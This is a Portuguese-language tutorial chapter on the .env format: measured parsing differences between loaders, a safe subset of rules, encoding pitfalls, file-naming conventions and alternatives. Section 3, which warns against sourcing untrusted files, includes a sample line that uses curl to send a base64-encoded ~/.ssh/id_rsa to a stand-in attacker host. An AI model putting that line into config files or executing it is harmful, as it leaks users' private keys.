# 12 · O formato `.env` — o padrão que não existe

`Nível: intermediário` · `Atualizado em: 14/08/2026`

> **Não existe especificação de `.env`.** Não há RFC, não há POSIX, não há comitê.
> Cada biblioteca implementou o seu dialeto a partir do que o `dotenv` de Ruby fazia
> em 2012, e elas **divergem em silêncio**. Este arquivo mostra as divergências
> **medidas**, não supostas.

---

## 1. O experimento

Escrevi um `.env` com doze casos-limite e passei pelos três carregadores mais usados,
nesta máquina, em **14/08/2026**:

- **Node `--env-file` nativo** — Node v24.18.0
- **`dotenv` (npm)** — 17.4.2
- **`python-dotenv`** — 1.2.3

O arquivo:

```bash
SIMPLES=valor
ASPAS_DUPLAS="com espaco"
ASPAS_SIMPLES='literal $NAO_EXPANDE'
COM_HASH="abc#123"
HASH_SEM_ASPAS=abc#123
EXPANSAO=${SIMPLES}/api
VAZIO=
ESPACO_ANTES_IGUAL = xyz
export COM_EXPORT=sim
MULTILINHA="linha1
linha2"
CIFRAO=a$b
BARRA_N="col1\ncol2"
```

### Resultado medido

| Linha do `.env` | Node `--env-file` | `dotenv` 17.4.2 | `python-dotenv` 1.2.3 |
|---|---|---|---|
| `SIMPLES=valor` | `"valor"` | `"valor"` | `'valor'` |
| `ASPAS_DUPLAS="com espaco"` | `"com espaco"` | `"com espaco"` | `'com espaco'` |
| `ASPAS_SIMPLES='literal $NAO_EXPANDE'` | literal | literal | literal |
| `COM_HASH="abc#123"` | `"abc#123"` | `"abc#123"` | `'abc#123'` |
| **`HASH_SEM_ASPAS=abc#123`** | **`"abc"`** ⚠️ | **`"abc"`** ⚠️ | **`'abc#123'`** ⚠️ |
| **`EXPANSAO=${SIMPLES}/api`** | **`"${SIMPLES}/api"`** ⚠️ | **`"${SIMPLES}/api"`** ⚠️ | **`'valor/api'`** ⚠️ |
| `VAZIO=` | `""` | `""` | `''` |
| `ESPACO_ANTES_IGUAL = xyz` | `"xyz"` | `"xyz"` | `'xyz'` |
| `export COM_EXPORT=sim` | `"sim"` | `"sim"` | `'sim'` |
| `MULTILINHA="linha1⏎linha2"` | quebra real (13 bytes) | idem | idem |
| `CIFRAO=a$b` | `"a$b"` | `"a$b"` | `'a$b'` |
| `BARRA_N="col1\ncol2"` | **quebra real** (9 bytes) | idem | idem |

**Duas divergências reais, e ambas mordem em produção:**

### ⚠️ Divergência 1 — `#` sem espaço antes

```bash
SENHA=abc#123
```

- Node e `dotenv`: o valor é **`abc`**. O `#` inicia comentário mesmo colado ao valor.
- `python-dotenv`: o valor é **`abc#123`**.

Você troca a mesma senha entre um serviço Node e um serviço Python e **um dos dois
autentica, o outro não**, com a mesma linha no mesmo arquivo. Já vi isso consumir uma
tarde inteira.

**Regra:** se o valor tem `#`, use aspas. Sempre. Ou, melhor: gere segredos sem `#`.

### ⚠️ Divergência 2 — expansão de variável

```bash
BASE=https://api.exemplo.com
URL=${BASE}/v1
```

- Node nativo e `dotenv` (sem o plugin `dotenv-expand`): o valor é a **string
  literal** `${BASE}/v1`. Sua aplicação vai tentar conectar em um host chamado
  `${BASE}`.
- `python-dotenv` e `phpdotenv`: expandem, e o valor é `https://api.exemplo.com/v1`.

**Regra:** não use expansão em `.env`. Escreva o valor inteiro. Se a repetição
incomodar, monte a URL **no código**, onde você tem uma linguagem de verdade.

---

## 2. O subconjunto seguro

Escreva `.env` só com isto, e ele se comporta igual em qualquer lugar:

```bash
# comentário em linha própria, começando a coluna 1
NOME=valor_sem_espaco_sem_cerquilha_sem_cifrao
COM_ESPACO="valor com espaço"
```

Regras, em ordem de importância:

1. **Uma variável por linha**, `NOME=valor`, sem espaço ao redor do `=`.
2. **MAIÚSCULAS**, `[A-Z_][A-Z0-9_]*`. Nunca comece com dígito, nunca use `-`.
3. **Aspas duplas** só quando o valor tiver espaço, `#` ou `:`.
4. **Nunca** use expansão `${…}`.
5. **Nunca** ponha comentário no fim da linha de valor.
6. **Sem `export`** (funciona em todos, mas confunde: sugere que o arquivo é script).
7. Termine o arquivo com quebra de linha.
8. **LF, não CRLF** (ver §4).

---

## 3. O `.env` **não é** um script de shell — exceto quando é

```bash
set -a; source .env; set +a
```

Essa é a forma canônica de carregar um `.env` no próprio shell (§1 do
[05-manual-de-uso.md](05-manual-de-uso.md)). E ela tem uma diferença brutal em
relação a `--env-file`: **`source` executa o arquivo**.

```bash
# .env de aparência inocente
DATABASE_URL=postgres://localhost/app
API_KEY=$(curl -s https://atacante.exemplo/exfiltra?d=$(cat ~/.ssh/id_rsa | base64 -w0))
```

Com `--env-file`, `dotenv` ou `python-dotenv`, a segunda linha é uma **string literal**
inofensiva. Com `source`, ela **executa**: sua chave SSH acabou de sair da máquina.

Consequências práticas:

- **Nunca** dê `source` num `.env` que veio de fora (de um cliente, de um colega, de
  um repositório de terceiro).
- O `EnvironmentFile` do systemd e o `--env-file` do Docker **não** são shell — logo
  `VAR=$OUTRA` não expande, `$(comando)` não executa, e `export` não é aceito pelo
  Docker. Isso é segurança, e é a razão de o formato deles ser mais restrito.
- O `.envrc` do `direnv` **é** shell de propósito — daí ele exigir `direnv allow`.

---

## 4. Codificação, quebra de linha e caracteres invisíveis

| Problema | Sintoma | Diagnóstico | Correção |
|---|---|---|---|
| **CRLF** (arquivo salvo no Windows) | senha "certa" é recusada; o valor tem um `\r` invisível no fim | `file .env` diz `CRLF line terminators` | `dos2unix .env` ou configurar o editor |
| **BOM UTF-8** | a **primeira** variável não é encontrada; o nome começa com `﻿` | `head -c 3 .env \| xxd` mostra `efbbbf` | salvar sem BOM |
| **Espaço no fim** | senha recusada | `printenv SENHA \| cat -A` → `abc123 $` | apagar o espaço |
| **Aspas duplicadas** | valor sai como `"abc"` com aspas | `printenv X` mostra as aspas | escolher: aspas no arquivo **ou** no shell, nunca as duas |
| **Acentos** | mojibake | `file .env` → deve dizer UTF-8 | salvar em UTF-8 |

Verificação rápida antes de culpar o código:

```bash
file .env
# esperado: ASCII text  ou  UTF-8 Unicode text  (NÃO: "with CRLF line terminators")
```

```bash
cat -A .env | head -5
# cada linha deve terminar em '$'. Se terminar em '^M$', é CRLF.
```

---

## 5. A família `.env.*` — e a única convenção que importa

Frameworks inventaram uma proliferação de arquivos, e as regras de precedência
diferem entre eles:

| Arquivo | Uso típico | Versionar? |
|---|---|---|
| `.env` | valores locais do desenvolvedor | **NÃO** |
| `.env.example` / `.env.sample` | o **contrato**: nomes, sem valores | **SIM** |
| `.env.local` | sobrescreve o `.env` na máquina de quem programa | **NÃO** |
| `.env.development` / `.env.production` | por ambiente (Vite, Next, Laravel) | ⚠️ só se não tiver segredo |
| `.env.test` | fixtures determinísticas para teste | ⚠️ só se não tiver segredo |
| `.env.vault`, `.env.enc` | criptografado | sim, se realmente criptografado |

> ⚠️ **`.env.production` versionado é uma armadilha de nome.** O nome sugere
> legitimidade, e a existência do arquivo convida a colocar valores de produção
> dentro. **Um `.env.production` no repositório só pode conter configuração pública.**
> Se tem segredo, é a mesma coisa que commitar o `.env`, com um nome que engana o
> revisor de código.

E o alerta do Twelve-Factor, que continua sendo o mais ignorado do documento:
**não agrupe configuração por nome de ambiente**. Assim que existem `.env.staging` e
`.env.production` no repositório, alguém vai criar `.env.staging2` e
`.env.production-cliente-x`, e em dois anos ninguém sabe qual está em uso onde.
Só existe **um** conjunto de variáveis; quem as preenche muda por lugar.

O `.gitignore` que resolve isso está em [06-exemplos.md #1](06-exemplos.md):
ignore `.env` e `.env.*`, e **libere só os `*.example`**.

---

## 6. Alternativas ao formato

Sim, existem, e vale conhecer antes de ficar amarrado ao `.env`:

| Formato | Vantagem | Desvantagem | Quando eu usaria |
|---|---|---|---|
| **`.env`** | universal, trivial | sem tipo, sem esquema, dialetos divergentes | desenvolvimento local |
| **YAML/TOML + cofre** | tipos, hierarquia, comentários | mais uma dependência; YAML tem armadilhas próprias (`NO` vira `false`) | configuração grande e estruturada |
| **JSON** | sem ambiguidade, todo mundo lê | sem comentário; ilegível à mão | configuração gerada por máquina |
| **`.envrc` (direnv)** | é shell: pode calcular valores | executa código | desenvolvimento, com `direnv allow` |
| **SOPS (`*.enc.yaml`)** | versionável, criptografado por valor, `git diff` útil | exige gestão de chaves | segredo que precisa viver no repositório |
| **Cofre (Vault/AWS/GCP)** | rotação, auditoria, credencial dinâmica | infraestrutura, custo, o problema do segredo zero | produção séria |
| **`systemd` credentials** (`LoadCredential=`) | o segredo vira arquivo em `/run`, **não** vira variável de ambiente | só Linux, systemd 247+ | serviço Linux moderno; subestimado |

Sobre a última linha, uma opinião minha que vejo pouca gente defender: o
`LoadCredential=` do systemd é a resposta mais limpa que existe para quem entrega em
servidor Linux e não quer cofre. O segredo é entregue como arquivo em um `tmpfs`
privado do serviço, com permissão só para ele, **sem passar pelo ambiente** — o que
elimina de uma vez o vazamento por `/proc/PID/environ`, por herança para
subprocessos e por relatório de crash. Está em
[30-entrega-em-producao.md §3](30-entrega-em-producao.md).

---

## 7. A regra dos cinco porquês: por que nunca padronizaram o `.env`?

**1.** Porque cada implementação copiou o comportamento observado da anterior, não uma
especificação.

**2.** Porque a primeira (`dotenv` de Ruby, 2012) foi escrita como utilitário pequeno
para uso local, e não se escreve especificação para utilitário pequeno.

**3.** Porque quando o uso explodiu (2014–2018), já existiam dezenas de
implementações incompatíveis, e padronizar significaria **quebrar** arquivos
existentes de milhões de projetos.

**4.** Porque não há quem tenha autoridade nem incentivo para isso: não é do
kernel, não é de nenhuma linguagem, não é de nenhum órgão. É um formato órfão.

**5.** Porque, na prática, ninguém sente dor suficiente: quem usa uma linguagem só
nunca percebe a divergência. A dor só aparece em ambiente poliglota — que é
minoria, ainda que crescente.

Ponto de parada: **convenção arbitrária sem dono**. Vai continuar assim.
E a decisão de engenharia que decorre disso é: **trate o `.env` como um formato
frágil e use o subconjunto seguro do §2.**

---

## Autoteste

1. `SENHA=abc#123`, sem aspas. Qual o valor em Node e qual em Python? Por que isso é perigoso?
2. `URL=${BASE}/v1`. Em quais carregadores isso funciona e em quais não?
3. Cite três diferenças entre `source .env` e `node --env-file=.env`.
4. Por que o `EnvironmentFile` do systemd não aceita `$(comando)`, e por que isso é bom?
5. Como você detecta que um `.env` tem CRLF, e qual sintoma isso produz?
6. Por que um `.env.production` versionado é mais perigoso que um `.env` versionado?
7. O que o `LoadCredential=` do systemd resolve que uma variável de ambiente não resolve?
8. Enuncie o "subconjunto seguro" em três regras.
9. Por que o `.env` nunca foi padronizado? Qual é o ponto de parada legítimo dessa pergunta?

---

**Medições feitas em 14/08/2026** em Ubuntu 22.04.5 com Node v24.18.0,
`dotenv` 17.4.2 e `python-dotenv` 1.2.3.
**Não medido aqui:** `vlucas/phpdotenv` (o Composer não está instalado nesta máquina);
o comportamento descrito para ele vem da documentação oficial do projeto.

**Próximo:** [15-node.md](15-node.md) · Voltar ao [mapa](00-MAPA.md)
